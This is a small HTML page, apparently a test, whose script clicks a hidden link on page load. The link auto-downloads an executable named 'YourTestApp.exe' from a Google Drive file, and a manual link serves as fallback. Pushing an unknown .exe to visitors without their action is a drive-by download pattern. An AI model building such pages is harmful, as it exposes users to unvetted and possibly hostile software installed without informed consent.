<!DOCTYPE html>
<html>
<head>
  <title>Auto Download Test App</title>
  <meta charset="UTF-8">
  <script>
    window.onload = function () {
      const link = document.createElement('a');
      link.href = "https://drive.google.com/uc?export=download&id=19XIXtPZ37a7yx4UFTrtzxfmjM1QeJG_p";
      link.download = "YourTestApp.exe";
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    };
  </script>
</head>
<body style="background-color: black; color: white; text-align: center; padding-top: 100px;">
  <h1>Preparing your download...</h1>
  <p>If the download doesn't start, <a href="https://drive.google.com/uc?export=download&id=19XIXtPZ37a7yx4UFTrtzxfmjM1QeJG_p">click here manually</a>.</p>
</body>
</html>
